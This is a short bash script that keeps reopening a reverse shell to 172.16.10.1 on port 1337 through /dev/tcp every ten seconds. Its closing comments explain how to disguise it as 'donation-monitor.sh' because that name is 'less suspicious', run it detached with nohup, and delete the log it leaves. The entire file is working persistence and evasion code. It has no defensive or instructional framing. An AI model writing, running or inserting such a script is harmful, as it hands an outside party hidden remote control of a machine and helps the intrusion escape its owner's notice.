#!/bin/bash
TARGET_HOST="172.16.10.1"
TARGET_PORT="1337"


# Function to restart the reverse shell process
restart_reverse_shell() {
    echo "Restarting reverse shell..."
    bash -i >& "/dev/tcp/${TARGET_HOST}/${TARGET_PORT}" 0>&1 &
}


# Continuously monitor the state of the reverse shell.
while true; do
    restart_reverse_shell
    # Sleep for a desired interval before checking again.
    sleep 10
done


# $cp reverse_shell_monitor.sh donation-monitor.sh  # less suspicious
# $ chmod +x ./donation-monitor.sh  # allow executable bit
# $ nohup ./donation-monitor.sh > /dev/null 2>&1 &
# $ rm nohup.out
